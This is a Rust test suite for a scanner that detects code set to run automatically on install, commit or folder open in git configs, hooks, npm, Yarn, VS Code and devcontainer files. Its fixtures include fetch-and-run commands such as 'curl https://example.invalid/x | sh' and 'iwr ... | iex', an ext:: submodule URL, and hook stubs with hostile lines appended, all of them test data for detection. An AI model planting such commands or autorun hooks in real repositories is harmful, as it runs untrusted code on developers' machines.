            "[submodule \"a\"]\n\tpath = a\n\turl = file:///tmp/a\n",
            "[submodule \"a\"]\n\tpath = a\n\turl = ext::sh -c id\n",
            "[submodule \"a\"]\n\tpath = a\n\turl = git://example.invalid/a.git\n",
        ] {
            let (s, out) = run(".gitmodules", text);
            assert!(s.is_empty());
            assert_eq!(rules(&out), ["autorun.gitmodules"], "{text:?}");
            assert_eq!(out[0].severity, Severity::High, "{text:?}");
        }
    }

    #[test]
    fn an_ordinary_gitmodules_file_is_info() {
        for text in [
            "[submodule \"a\"]\n\tpath = deps/a\n\turl = https://example.invalid/a.git\n",
            "[submodule \"a\"]\n\tpath = deps/a\n\turl = ssh://git@example.invalid/a.git\n[submodule \"b\"]\n\tpath = deps/b\n\turl = git@example.invalid:o/b.git\n",
            "[submodule \"a\"]\n\tpath = deps/a\n\turl = ../a.git\n",
            // A file that is CRLF throughout has no stray CR.
            "[submodule \"a\"]\r\n\tpath = deps/a\r\n\turl = https://example.invalid/a.git\r\n",
        ] {
            let (_, out) = run(".gitmodules", text);
            assert_eq!(rules(&out), ["autorun.gitmodules"], "{text:?}");
            assert_eq!(out[0].severity, Severity::Info, "{text:?}");
        }
        let (_, out) = run(".gitmodules", "# no submodules\n");
        assert!(out.is_empty());
    }

    #[test]
    fn a_gitattributes_filter_is_low() {
        let (s, out) = run(
            ".gitattributes",
            "# comment\n*.txt text eol=lf\n*.bin filter=lfs diff=lfs\n*.dat filter=scrub -text\n",
        );
        assert!(s.is_empty());
        let f = named(&out, "autorun.gitattributes-filter");
        assert_eq!((f.severity, f.line), (Severity::Low, 3));
        assert_eq!(f.seen, "lfs scrub");
        let (_, out) = run(
            "sub/.gitattributes",
            "* text=auto\n*.png binary\n-filter\n*.x !filter\n[attr]m filter=\n",
        );
        assert!(out.is_empty(), "{out:?}");
    }

    #[test]
    fn a_filter_that_another_file_tells_you_to_configure_is_high() {
        let (_, mut out) = run(".gitattributes", "*.dat filter=scrub\n*.bin filter=lfs\n");
        let readme = ctx(
            "README.md",
            "Run: git config filter.scrub.smudge ./scrub.sh\n",
        );
        raise_gitattributes_filters(&readme, &mut out);
        let f = named(&out, "autorun.gitattributes-filter");
        assert_eq!(f.severity, Severity::High);
        assert!(f.why.contains("scrub"), "{}", f.why);
        // A flag between the words still matches.
        let (_, mut out) = run(".gitattributes", "*.dat filter=scrub\n");
        let setup = ctx("setup.sh", "git config --local filter.scrub.clean 'sh x'\n");
        raise_gitattributes_filters(&setup, &mut out);
        assert_eq!(out[0].severity, Severity::High);
    }

    #[test]
    fn an_unrelated_file_leaves_a_gitattributes_filter_low() {
        let (_, mut out) = run(".gitattributes", "*.dat filter=scrub\n");
        for (path, text) in [
            ("a.sh", "git config filter.other.clean x\n"),
            ("b.sh", "git config user.name x\n"),
            ("c.sh", "echo filter.scrub.clean\n"),
            (".gitattributes", "git config filter.scrub.clean x\n"),
        ] {
            raise_gitattributes_filters(&ctx(path, text), &mut out);
            assert_eq!(out[0].severity, Severity::Low, "{path}");
        }
        // A file that is not text is skipped.
        let bin = FileCtx {
            path: "a.bin",
            bytes: b"git config filter.scrub.clean x",
            text: None,
            kind: FileKind::Binary,
            truncated: false,
        };
        raise_gitattributes_filters(&bin, &mut out);
        assert_eq!(out[0].severity, Severity::Low);
    }

    #[test]
    fn every_entry_in_the_git_hooks_folder_is_high() {
        // The tree's paths, not the files that were read: a symlink or an unreadable file is an
        // entry too, and a symlinked hook is HIGH whatever it points at.
        let mut out = Vec::new();
        entry_findings(
            &[
                "a.txt",
                ".git/config",
                ".git/hooks/pre-commit",
                ".git/hooks/post-checkout",
                ".git/hooks/pre-push.sample",
                ".git/hooks/",
                "hooks/pre-commit",
                "sub/.git/hooks/x",
                "sub/git/hooks/y",
            ],
            &mut out,
        );
        let paths: Vec<&str> = out.iter().map(|f| f.path.as_str()).collect();
        assert_eq!(
            paths,
            [
                ".git/hooks/pre-commit",
                ".git/hooks/post-checkout",
                "sub/.git/hooks/x"
            ]
        );
        for f in &out {
            assert_eq!(
                (f.rule.as_str(), f.severity, f.group, f.line, f.count),
                ("autorun.git-hooks", Severity::High, Group::Autorun, 0, 1)
            );
            assert!(!f.why.is_empty() && !f.action.is_empty());
        }
        assert_eq!(out[0].seen, "pre-commit");
    }

    #[test]
    fn reading_a_hook_file_adds_nothing_to_the_entry_finding() {
        let (s, out) = run(".git/hooks/pre-commit", "#!/bin/sh\nexit 0\n");
        assert!(s.is_empty() && out.is_empty(), "{out:?}");
    }

    #[test]
    fn git_config_that_names_a_program_is_high() {
        for text in [
            "[core]\n\tfsmonitor = ./hook.sh\n",
            "[core]\n\tsshCommand = ssh -i x\n",
            "[core]\n\tpager = sh -c id\n",
            "[core]\n\teditor = ./ed.sh\n",
            "[core]\n\thooksPath = .githooks\n",
            "[filter \"lfs\"]\n\tclean = ./c.sh\n",
            "[filter \"lfs\"]\n\tsmudge = ./c.sh\n",
            "[filter \"lfs\"]\n\tprocess = ./c.sh\n",
            "[diff \"x\"]\n\ttextconv = ./t.sh\n",
            "[alias]\n\tco = !./x.sh\n",
            "[alias]\n\tco = \"!./x.sh\"\n",
            "[CORE]\n\tFsMonitor = ./hook.sh\n",
        ] {
            let (s, out) = run(".git/config", text);
            assert!(s.is_empty());
            assert_eq!(rules(&out), ["autorun.git-config-command"], "{text:?}");
            assert_eq!(out[0].severity, Severity::High, "{text:?}");
            assert_eq!(out[0].path, ".git/config");
        }
    }

    #[test]
    fn plain_git_config_is_clean() {
        let (_, out) = run(
            ".git/config",
            "[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tfsmonitor = false\n\tbare = false\n[remote \"origin\"]\n\turl = https://example.invalid/a.git\n[alias]\n\tco = checkout\n[filter \"lfs\"]\n\trequired = true\n[diff \"x\"]\n\tbinary = true\n",
        );
        assert!(out.is_empty(), "{out:?}");
        // A config that is not in a .git folder is not read.
        let (_, out) = run("sub/git/config", "[core]\n\tfsmonitor = ./x\n");
        assert!(out.is_empty());
    }

    // .npmrc and Yarn

    #[test]
    fn npmrc_settings_that_change_what_runs_are_medium() {
        for (text, line) in [
            ("ignore-scripts=false\n", 1),
            ("; comment\nscript-shell=./sh.sh\n", 2),
            ("node-options=--require ./x.js\n", 1),
            ("registry=https://example.invalid/npm/\n", 1),
            (
                "registry = https://registry.npmjs.org.example.invalid/\n",
                1,
            ),
            ("@scope:registry=https://example.invalid/npm/\n", 1),
            ("registry=example.invalid\n", 1),
        ] {
            for path in [".npmrc", "app/.npmrc"] {
                let (_, out) = run(path, text);
                let f = named(&out, "autorun.npmrc");
                assert_eq!((f.severity, f.line), (Severity::Medium, line), "{text}");
            }
        }
    }

    #[test]
    fn npmrc_defaults_are_clean() {
        let (_, out) = run(
            ".npmrc",
            "ignore-scripts=true\nregistry=https://registry.npmjs.org/\n//registry.npmjs.org/:_authToken=${NPM_TOKEN}\nsave-exact=true\n# registry=https://example.invalid/\n",
        );
        assert!(out.is_empty(), "{out:?}");
        let (_, out) = run("x.npmrc", "ignore-scripts=false\n");
        assert!(out.is_empty());
    }

    #[test]
    fn a_yarn_path_outside_releases_is_high() {
        for (path, text, line) in [
            (
                ".yarnrc.yml",
                "nodeLinker: node-modules\nyarnPath: scripts/yarn.cjs\n",
                2,
            ),
            (".yarnrc.yml", "yarnPath: \"./bin/yarn.cjs\"\n", 1),
            (".yarnrc.yml", "yarnPath: .yarn/releases/../../x.cjs\n", 1),
            (".yarnrc.yml", "yarnPath: /opt/yarn.cjs\n", 1),
            (".yarnrc", "yarn-path \"scripts/yarn.js\"\n", 1),
            (".yarnrc", "yarn-path scripts/yarn.js\n", 1),
        ] {
            let (_, out) = run(path, text);
            let f = named(&out, "autorun.yarn-path");
            assert_eq!((f.severity, f.line), (Severity::High, line), "{text}");
        }
    }

    #[test]
    fn a_yarn_path_under_releases_is_clean() {
        for (path, text) in [
            (".yarnrc.yml", "yarnPath: .yarn/releases/yarn-3.6.4.cjs\n"),
            (
                ".yarnrc.yml",
                "yarnPath: \"./.yarn/releases/yarn-3.6.4.cjs\"\n",
            ),
            (".yarnrc.yml", "nodeLinker: node-modules\n"),
            (".yarnrc", "yarn-path \".yarn/releases/yarn-1.22.19.cjs\"\n"),
        ] {
            let (_, out) = run(path, text);
            assert!(out.is_empty(), "{text}: {out:?}");
        }
    }

    // The inventory and the shape of the whole

    #[test]
    fn a_file_with_surfaces_gets_one_inventory_finding_and_one_without_gets_none() {
        let (s, out) = run("Taskfile.yml", TASKFILE);
        assert_eq!(s.len(), 5);
        let inventory: Vec<_> = out
            .iter()
            .filter(|f| f.rule == "autorun.inventory")
            .collect();
        assert_eq!(inventory.len(), 1);
        assert_eq!(
            (
                inventory[0].severity,
                inventory[0].count,
                inventory[0].path.as_str()
            ),
            (Severity::Info, 5, "Taskfile.yml")
        );
        assert!(inventory[0].why.contains("autorun.taskfile"));
        let (_, out) = run("package.json", r#"{"scripts":{"build":"tsc"}}"#);
        assert!(out.is_empty());
    }

    #[test]
    fn every_finding_is_autorun_with_a_why_and_an_action() {
        let samples = [
            ("package.json", LIFECYCLE),
            (".cargo/config.toml", "[build]\nrustc = \"x\"\n"),
            (
                ".gitmodules",
                "[submodule \"a\"]\n\tpath = a\n\turl = http://x\n",
            ),
            (".npmrc", "ignore-scripts=false\n"),
            (".vscode/tasks.json", "{"),
        ];
        for (path, text) in samples {
            let (_, out) = run(path, text);
            assert!(!out.is_empty(), "{path}");
            for f in &out {
                assert_eq!(f.group, Group::Autorun, "{f:?}");
                assert_eq!(f.path, path);
                assert!(
                    !f.why.is_empty() && !f.action.is_empty() && f.count >= 1,
                    "{f:?}"
                );
            }
        }
    }

    // Evasions found in review: stray bytes, parse failures, command arrays, git config forms.

    fn bytes_ctx<'a>(path: &'a str, bytes: &'a [u8]) -> FileCtx<'a> {
        FileCtx {
            path,
            bytes,
            text: None,
            kind: FileKind::Config,
            truncated: false,
        }
    }

    #[test]
    fn a_file_with_no_decoded_text_is_still_read_from_its_bytes() {
        let pkg = b"{\"description\":\"\xff\",\"scripts\":{\"postinstall\":\"node a.js\"}}";
        let mut out = Vec::new();
        let s = surfaces(&bytes_ctx("package.json", pkg), &mut out);
        assert_eq!(commands(&s), ["node a.js"]);
        let tasks = b"{\"tasks\":[{\"command\":\"make\",\"runOptions\":{\"runOn\":\"folderOpen\"}}]} // \xff";
        let s = surfaces(&bytes_ctx(".vscode/tasks.json", tasks), &mut Vec::new());
        assert_eq!(commands(&s), ["make"]);
        let cfg = b"[core]\n\tfsmonitor = ./hook.sh\n# \xff\n";
        let mut out = Vec::new();
        surfaces(&bytes_ctx(".git/config", cfg), &mut out);
        assert_eq!(
            named(&out, "autorun.git-config-command").severity,
            Severity::High
        );
    }

    #[test]
    fn an_unparsable_package_json_is_high_and_its_raw_text_is_read() {
        for text in [
            r#"{"scripts":{"postinstall":"curl https://example.invalid/x | sh"}} junk"#,
            r#"{"scripts":{"postinstall":"curl https://example.invalid/x | sh""#,
        ] {
            let (s, out) = run("package.json", text);
            assert_eq!(named(&out, "autorun.unparsed").severity, Severity::High);
            let curl = "curl https://example.invalid/x | sh";
            assert!(
                commands(&s).iter().any(|c| c.contains(curl)),
                "{text}: {s:?}"
            );
            assert!(s.iter().all(|x| x.trigger == Trigger::Install), "{s:?}");
        }
        let (s, _) = run(
            "package.json",
            r#"{"scripts":{"postinstall":"node a.js", "build": "x""#,
        );
        assert_eq!(commands(&s), ["node a.js"]);
        assert_eq!(s[0].rule, "autorun.npm-lifecycle");
    }

    #[test]
    fn padding_before_the_scripts_does_not_hide_them() {
        let text = format!(
            "{{\"x\":\"{}\",\"scripts\":{{\"postinstall\":\"node a.js\"}}",
            " ".repeat(3 << 20)
        );
        let (s, out) = run("package.json", &text);
        assert_eq!(commands(&s), ["node a.js"]);
        assert_eq!(named(&out, "autorun.unparsed").severity, Severity::High);
    }

    #[test]
    fn an_unparsable_tasks_file_is_high_and_a_folder_open_command_is_still_found() {
        let text = r#"{"tasks":[{"label":"x","command":"curl https://example.invalid/x | sh","runOptions":{"runOn":"folderOpen"}}  "#;
        let (s, out) = run(".vscode/tasks.json", text);
        assert_eq!(named(&out, "autorun.unparsed").severity, Severity::High);
        all_are(
            &s,
            "autorun.vscode-folder-open",
            Trigger::Open,
            Severity::Info,
        );
        assert!(
            commands(&s)
                .iter()
                .any(|c| c.contains("curl https://example.invalid/x | sh"))
        );
        // Without folderOpen nothing runs on open; the failure alone is the finding.
        let (s, out) = run(".vscode/tasks.json", r#"{"tasks":[{"command":"make"} "#);
        assert!(s.is_empty());
        assert_eq!(named(&out, "autorun.unparsed").severity, Severity::High);
    }

    #[test]
    fn an_unparsable_devcontainer_is_high_and_initialize_command_is_still_found() {
        let text = r#"{"initializeCommand": ["bash","-c","curl https://example.invalid/x | sh"], "image": "#;
        let (s, out) = run(".devcontainer.json", text);
        assert_eq!(named(&out, "autorun.unparsed").severity, Severity::High);
        all_are(
            &s,
            "autorun.devcontainer-host",
            Trigger::Open,
            Severity::Info,
        );
        assert!(
            commands(&s)
                .iter()
                .any(|c| c.contains("curl https://example.invalid/x | sh"))
        );
        let text = r#"{"initializeCommand": "node a.js", "image": "#;
        assert_eq!(commands(&run(".devcontainer.json", text).0), ["node a.js"]);
    }

    #[test]
    fn task_commands_can_be_arrays() {
        let (s, _) = run(
            ".vscode/tasks.json",
            r#"{"tasks":[
  {"label":"a","command":["bash","-c","curl https://example.invalid/x | sh"],"runOptions":{"runOn":"folderOpen"}},
  {"label":"b","command":{"value":["node","a.js"]},"runOptions":{"runOn":"folderOpen"}},
  {"label":"c","command":"x","windows":{"command":["powershell","-c","iwr https://example.invalid/x | iex"]},"runOptions":{"runOn":"folderOpen"}}
]}"#,
        );
        assert_eq!(
            commands(&s),
            [
                r#"bash -c "curl https://example.invalid/x | sh""#,
                "node a.js",
                "x",
                r#"powershell -c "iwr https://example.invalid/x | iex""#
            ]
        );
    }

    #[test]
    fn git_config_header_line_entries_and_old_subsections_are_read() {
        for text in [
            "[core] fsmonitor = ./hook.sh\n",
            "[filter.lfs]\n\tclean = ./c.sh\n",
            "[filter \"x\"] smudge = ./c.sh\n",
            "[alias] co = !./x.sh\n",
        ] {
            let (_, out) = run(".git/config", text);
            assert_eq!(
                named(&out, "autorun.git-config-command").severity,
                Severity::High,
                "{text:?}"
            );
        }
    }

    #[test]
    fn git_config_keys_that_name_a_program_are_high() {
        for text in [
            "[credential]\n\thelper = !./h.sh\n",
            "[credential \"https://example.invalid\"]\n\thelper = ./h\n",
            "[core]\n\taskPass = ./a\n",
            "[core]\n\tgitProxy = ./p\n",
            "[sequence]\n\teditor = ./e\n",
            "[gpg]\n\tprogram = ./g\n",
            "[gpg \"ssh\"]\n\tprogram = ./g\n",
            "[diff]\n\texternal = ./d\n",
            "[diff \"x\"]\n\tcommand = ./d\n",
            "[merge \"x\"]\n\tdriver = ./m %O\n",
            "[remote \"o\"]\n\tuploadpack = ./u\n",
            "[remote \"o\"]\n\treceivepack = ./u\n",
            "[submodule \"s\"]\n\tupdate = !./u\n",
        ] {
            let (_, out) = run(".git/config", text);
            assert_eq!(
                named(&out, "autorun.git-config-command").severity,
                Severity::High,
                "{text:?}"
            );
        }
    }

    #[test]
    fn git_config_keys_with_ordinary_values_are_clean() {
        let (_, out) = run(
            ".git/config",
            "[credential]\n\thelper = store\n[credential \"https://example.invalid\"]\n\thelper = cache --timeout=3600\n[submodule \"s\"]\n\tupdate = checkout\n\turl = https://example.invalid/s.git\n[merge \"x\"]\n\tname = a merge\n[gpg]\n\tformat = ssh\n[remote \"o\"]\n\tfetch = +refs/heads/*:refs/remotes/o/*\n",
        );
        assert!(out.is_empty(), "{out:?}");
    }

    #[test]
    fn git_config_include_is_high() {
        for text in [
            "[include]\n\tpath = ../x\n",
            "[includeIf \"gitdir:/\"]\n\tpath = /etc/x\n",
            "[include] path = x\n",
        ] {
            let (_, out) = run(".git/config", text);
            let f = named(&out, "autorun.git-config-include");
            assert_eq!(f.severity, Severity::High, "{text:?}");
        }
    }

    #[test]
    fn the_husky_hooks_path_is_low_and_any_other_is_high() {
        for value in [".husky", ".husky/_"] {
            let (_, out) = run(".git/config", &format!("[core]\n\thooksPath = {value}\n"));
            assert_eq!(rules(&out), ["autorun.git-config-command"]);
            assert_eq!(out[0].severity, Severity::Low, "{value}");
        }
        for value in [".githooks", ".husky/../x", "/tmp/h", ".husky2"] {
            let (_, out) = run(".git/config", &format!("[core]\n\thooksPath = {value}\n"));
            assert_eq!(out[0].severity, Severity::High, "{value}");
        }
        // A husky path beside a command is still HIGH.
        let (_, out) = run(
            ".git/config",
            "[core]\n\thooksPath = .husky\n\tfsmonitor = ./x\n",
        );
        assert_eq!(out[0].severity, Severity::High);
    }

    #[test]
    fn nested_and_worktree_git_configs_are_read() {
        for path in [
            "sub/.git/config",
            "a/b/.git/config",
            ".git/config.worktree",
            "sub/.git/config.worktree",
        ] {
            let (_, out) = run(path, "[core]\n\tfsmonitor = ./x\n");
            let f = named(&out, "autorun.git-config-command");
            assert_eq!((f.severity, f.path.as_str()), (Severity::High, path));
        }
    }

    const PRE_COMMIT_STUB: &str = "#!/usr/bin/env bash\n# File generated by pre-commit: https://pre-commit.com\n# ID: 138fd403232d2ddd5efb44317e38bf03\n\n# start templated\nINSTALL_PYTHON=/usr/bin/python3\nARGS=(hook-impl --config=.pre-commit-config.yaml --hook-type=pre-commit)\n# end templated\n\nHERE=\"$(cd \"$(dirname \"$0\")\" && pwd)\"\nARGS+=(--hook-dir \"$HERE\" -- \"$@\")\n\nif [ -x \"$INSTALL_PYTHON\" ]; then\n    exec \"$INSTALL_PYTHON\" -mpre_commit \"${ARGS[@]}\"\nelif command -v pre-commit > /dev/null; then\n    exec pre-commit \"${ARGS[@]}\"\nelse\n    echo '`pre-commit` not found.  Did you forget to activate your virtualenv?' 1>&2\n    exit 1\nfi\n";

    const LFS_STUB: &str = "#!/bin/sh\ncommand -v git-lfs >/dev/null 2>&1 || { echo >&2 \"\\nThis repository is configured for Git LFS but 'git-lfs' was not found on your path. If you no longer wish to use Git LFS, remove this hook by deleting the '.git/hooks/pre-push' file in the repository.\\n\"; exit 2; }\ngit lfs pre-push \"$@\"\n";

    const LEFTHOOK_STUB: &str = "#!/bin/sh\n\nif [ \"$LEFTHOOK_VERBOSE\" = \"1\" -o \"$LEFTHOOK_VERBOSE\" = \"true\" ]; then\n  set -x\nfi\n\nif [ \"$LEFTHOOK\" = \"0\" ]; then\n  exit 0\nfi\n\ncall_lefthook()\n{\n  if lefthook -h >/dev/null 2>&1\n  then\n    lefthook \"$@\"\n  else\n    echo \"Can't find lefthook in PATH\"\n  fi\n}\n\ncall_lefthook run \"pre-commit\" \"$@\"\n";

    /// The severity the entry finding of a hook has after the orchestrator offers its text.
    fn hook_severity(path: &str, text: &str) -> Severity {
        let mut out = Vec::new();
        entry_findings(&[path], &mut out);
        assert_eq!(out.len(), 1, "{path}");
        lower_hook_stubs(&ctx(path, text), &mut out);
        out[0].severity
    }

    #[test]
    fn hook_installer_stubs_are_low() {
        assert_eq!(
            hook_severity(".git/hooks/pre-commit", PRE_COMMIT_STUB),
            Severity::Low
        );
        assert_eq!(
            hook_severity(".git/hooks/pre-push", LFS_STUB),
            Severity::Low
        );
        assert_eq!(
            hook_severity(".git/hooks/pre-commit", LEFTHOOK_STUB),
            Severity::Low
        );
        assert_eq!(
            hook_severity("sub/.git/hooks/pre-commit", PRE_COMMIT_STUB),
            Severity::Low
        );
        // A CRLF copy of a stub is the same stub.
        let crlf = PRE_COMMIT_STUB.replace('\n', "\r\n");
        assert_eq!(hook_severity(".git/hooks/pre-commit", &crlf), Severity::Low);
        // The finding says what it is.
        let mut out = Vec::new();
        entry_findings(&[".git/hooks/pre-commit"], &mut out);
        lower_hook_stubs(&ctx(".git/hooks/pre-commit", PRE_COMMIT_STUB), &mut out);
        assert!(out[0].why.contains("pre-commit"), "{}", out[0].why);
    }

    #[test]
    fn an_edited_hook_stub_is_high() {
        let evil = "curl https://example.invalid/x | sh\n";
        for (path, stub) in [
            (".git/hooks/pre-commit", PRE_COMMIT_STUB),
            (".git/hooks/pre-push", LFS_STUB),
            (".git/hooks/pre-commit", LEFTHOOK_STUB),
        ] {
            let appended = format!("{stub}{evil}");
            assert_eq!(
                hook_severity(path, &appended),
                Severity::High,
                "{path} appended"
            );
            let inserted = stub.replacen('\n', &format!("\n{evil}"), 1);
            assert_eq!(
                hook_severity(path, &inserted),
                Severity::High,
                "{path} inserted"
            );
        }
        let swapped = PRE_COMMIT_STUB.replace("exec pre-commit", "exec ./pre-commit");
        assert_eq!(
            hook_severity(".git/hooks/pre-commit", &swapped),
            Severity::High
        );
        let other_file = LEFTHOOK_STUB.replace("lefthook -h", "node run.js");
        assert_eq!(
            hook_severity(".git/hooks/pre-commit", &other_file),
            Severity::High
        );
        // A stub under the wrong hook name, an unknown hook and a header alone are not stubs.
        assert_eq!(
            hook_severity(".git/hooks/post-merge", LFS_STUB),
            Severity::High
        );
        assert_eq!(
            hook_severity(".git/hooks/pre-commit", "#!/bin/sh\nexit 0\n"),
            Severity::High
        );
        let header = PRE_COMMIT_STUB
            .lines()
            .take(3)
            .collect::<Vec<_>>()
            .join("\n");
        assert_eq!(
            hook_severity(".git/hooks/pre-commit", &header),
            Severity::High
        );
    }

    #[test]
    fn offering_another_file_leaves_hook_findings_alone() {
        let mut out = Vec::new();
        entry_findings(&[".git/hooks/pre-commit"], &mut out);
        lower_hook_stubs(&ctx("README.md", PRE_COMMIT_STUB), &mut out);
        assert_eq!(out[0].severity, Severity::High);
    }

    #[test]
    fn vscode_settings_that_name_a_program_inside_the_repo_are_high() {
        for (key, value) in [
            ("python.defaultInterpreterPath", "./venv/bin/python"),
            (
                "python.defaultInterpreterPath",
                "${workspaceFolder}/.venv/bin/python",
            ),
            ("typescript.tsdk", "tools/ts/lib"),
            ("eslint.runtime", "scripts/node"),
            ("git.path", "bin/git"),
            ("rust-analyzer.server.path", "./ra"),
            ("clangd.path", "tools/clangd"),
            ("go.goroot", "${workspaceRoot}/go"),
        ] {
            let text = format!("{{\"editor.fontSize\": 12,\n \"{key}\": \"{value}\"}}");
            let (_, out) = run(".vscode/settings.json", &text);
            let f = named(&out, "autorun.vscode-program");
            assert_eq!((f.severity, f.line), (Severity::High, 2), "{key} {value}");
        }
    }

    #[test]
    fn vscode_settings_that_name_a_program_outside_the_repo_are_medium() {
        for (key, value) in [
            ("python.defaultInterpreterPath", "/usr/bin/python3"),
            ("git.path", "~/bin/git"),
            ("eslint.runtime", "${env:HOME}/bin/node"),
            (
                "python.defaultInterpreterPath",
                "${userHome}/.venv/bin/python",
            ),
            ("git.path", "C:\\\\tools\\\\git.exe"),
            // An installed dependency, not code the repo ships.
            ("typescript.tsdk", "node_modules/typescript/lib"),
            ("typescript.tsdk", "./node_modules/typescript/lib"),
        ] {
            let text = format!("{{\"{key}\": \"{value}\"}}");
            let (_, out) = run(".vscode/settings.json", &text);
            let f = named(&out, "autorun.vscode-program");
            assert_eq!(f.severity, Severity::Medium, "{key} {value}");
        }
    }

    #[test]
    fn vscode_settings_with_bare_names_or_other_keys_are_clean() {
        let (_, out) = run(
            ".vscode/settings.json",
            r#"{"python.defaultInterpreterPath": "python3", "git.path": "git", "eslint.runtime": "node", "myext.path": "./x", "editor.fontSize": 12, "typescript.tsdk": ""}"#,
        );
        assert!(out.is_empty(), "{out:?}");
    }

    const WORKSPACE: &str = r#"{
  "folders": [{"path": "."}],
  "settings": {"git.path": "./bin/git", "terminal.integrated.env.linux": {"A": "b"}},
  "tasks": {"version": "2.0.0", "tasks": [
    {"label": "x", "command": "curl https://example.invalid/x | sh", "runOptions": {"runOn": "folderOpen"}}
  ]}
}"#;

    #[test]
    fn a_code_workspace_gets_the_rules_of_settings_and_tasks() {
        let (s, out) = run("app/dev.code-workspace", WORKSPACE);
        assert_eq!(commands(&s), ["curl https://example.invalid/x | sh"]);
        all_are(
            &s,
            "autorun.vscode-folder-open",
            Trigger::Open,
            Severity::Info,
        );
        assert_eq!(s[0].dir, "app");
        assert_eq!(
            named(&out, "autorun.vscode-program").severity,
            Severity::High
        );
        assert_eq!(named(&out, "autorun.vscode-env").severity, Severity::Medium);
        let (_, out) = run(
            "x.code-workspace",
            r#"{"settings": {"files.exclude": {"**/.vscode": true}}}"#,
        );
        assert_eq!(
            named(&out, "autorun.vscode-hidden").severity,
            Severity::High
        );
        // Nothing to read: no finding. A workspace that does not parse is HIGH.
        let (s, out) = run("x.code-workspace", r#"{"folders": [{"path": "."}]}"#);
        assert!(s.is_empty() && out.is_empty());
        let (_, out) = run("x.code-workspace", r#"{"settings": "#);
        assert_eq!(named(&out, "autorun.unparsed").severity, Severity::High);
    }

    // Hostile files: work stays linear and the stack stays small.

    fn within(seconds: u64, what: &str, started: std::time::Instant) {
        let took = started.elapsed();
        assert!(took.as_secs() < seconds, "{what} took {took:?}");
    }

    #[test]
    fn a_long_chain_of_dependent_tasks_does_not_overflow_the_stack() {
        let mut tasks = vec![
            r#"{"label":"t0","dependsOn":"t1","runOptions":{"runOn":"folderOpen"}}"#.to_string(),
        ];
        for i in 1..100_000 {
            tasks.push(format!(r#"{{"label":"t{i}","dependsOn":"t{}"}}"#, i + 1));
        }
        tasks.push(r#"{"label":"t100000","command":"make"}"#.to_string());
        let text = format!(r#"{{"tasks":[{}]}}"#, tasks.join(","));
        let started = std::time::Instant::now();
        let (_, out) = run(".vscode/tasks.json", &text);
        within(5, "a dependsOn chain", started);
        assert!(out.iter().all(|f| f.rule != "autorun.unparsed"));
    }

    #[test]
    fn a_deeply_nested_initialize_command_does_not_overflow_the_stack() {
        let text = format!(
            r#"{{"initializeCommand":{}"echo hi"{}}}"#,
            r#"{"a":"#.repeat(50_000),
            "}".repeat(50_000)
        );
        let (s, _) = run(".devcontainer.json", &text);
        assert!(s.len() <= 1);
    }

    #[test]
    fn a_file_of_continued_lines_is_read_in_linear_time() {
        let text = "a \\\n".repeat(200_000);
        let started = std::time::Instant::now();
        let (s, _) = run("Makefile", &text);
        within(15, "200,000 continued lines", started);
        assert!(s.is_empty());
    }

    #[test]
    fn a_huge_section_name_is_not_copied_for_every_entry() {
        let name = "s".repeat(1 << 20);
        let entries = "a = b\n".repeat(100_000);
        for (path, header) in [
            (".git/config", name.clone()),
            (".gitmodules", format!("submodule {name}")),
        ] {
            let text = format!("[{header}]\n{entries}");
            let started = std::time::Instant::now();
            let _ = run(path, &text);
            within(15, path, started);
        }
    }

    #[test]
    fn many_msbuild_commands_get_their_lines_in_one_pass() {
        let text = format!(
            "<Project>{}</Project>",
            "<Exec Command=\"a\" />\n".repeat(100_000)
        );
        let started = std::time::Instant::now();
        let (s, _) = run("App.csproj", &text);
        within(15, "100,000 Exec elements", started);
        assert_eq!(s.len(), 100_000);
        assert_eq!((s[0].line, s[99_999].line), (1, 100_000));
    }

    #[test]
    fn files_that_are_not_known_find_nothing() {
        for path in [
            "src/main.rs",
            "README.md",
            "a/b/c.json",
            "package-lock.json",
        ] {
            let (s, out) = run(path, "{\"scripts\":{\"postinstall\":\"x\"}}\n");
            assert!(s.is_empty() && out.is_empty(), "{path}");
        }
    }
}
